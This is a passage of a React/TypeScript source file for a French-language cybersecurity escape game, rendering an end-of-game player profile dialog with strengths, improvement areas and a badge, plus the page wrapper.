          <Dialog open={isShowingSummary} onOpenChange={setShowingSummary}>
            <DialogContent className="max-w-3xl bg-gray-950 border-red-900 text-white">
              <DialogHeader>
                <DialogTitle className="text-2xl font-bold">{playerProfile.profileTitle}</DialogTitle>
              </DialogHeader>
              
              <div className="space-y-6">
                <div>
                  <h3 className="text-xl font-bold mb-2">Résumé</h3>
                  <p className="text-gray-300">{playerProfile.profileSummary}</p>
                </div>
                
                <div>
                  <h3 className="text-xl font-bold mb-2 text-green-400">Forces</h3>
                  <ul className="list-disc list-inside space-y-1">
                    {playerProfile.strengths.map((strength: string, index: number) => (
                      <li key={index}>{strength}</li>
                    ))}
                  </ul>
                </div>
                
                <div>
                  <h3 className="text-xl font-bold mb-2 text-amber-400">Axes d'amélioration</h3>
                  <ul className="list-disc list-inside space-y-1">
                    {playerProfile.improvementAreas.map((area: string, index: number) => (
                      <li key={index}>{area}</li>
                    ))}
                  </ul>
                </div>
                
                <div className="bg-black/30 p-4 rounded-lg">
                  <h3 className="text-xl font-bold mb-2 text-blue-400">Badge obtenu</h3>
                  <div className="flex items-center gap-3">
                    <div className="bg-blue-900/50 p-3 rounded-full">
                      <HardDriveIcon className="h-8 w-8 text-blue-400" />
                    </div>
                    <div>
                      <p className="font-bold">{playerProfile.badge.title}</p>
                      <p className="text-gray-300 text-sm">{playerProfile.badge.description}</p>
                    </div>
                  </div>
                </div>
              </div>
              
              <DialogFooter>
                <Button variant="outline" className="mr-2" onClick={() => setShowingSummary(false)}>
                  Fermer
                </Button>
                <Button onClick={startNewGame}>
                  Nouvelle partie
                </Button>
              </DialogFooter>
            </DialogContent>
          </Dialog>
        )}
      </div>
    </div>
  );
};

// Page wrapper avec le contexte du jeu
export default function CyberEscapeParefeuPage() {
  return (
    <div className="min-h-screen bg-gradient-to-b from-red-950 via-red-900 to-orange-900 text-white">
      <PageTitle title="CYBER ESCAPE: LE PARE-FEU EST TOMBÉ" />
      
      <GameProvider>
        <CyberEscapeParefeu />
      </GameProvider>
    </div>
  );
}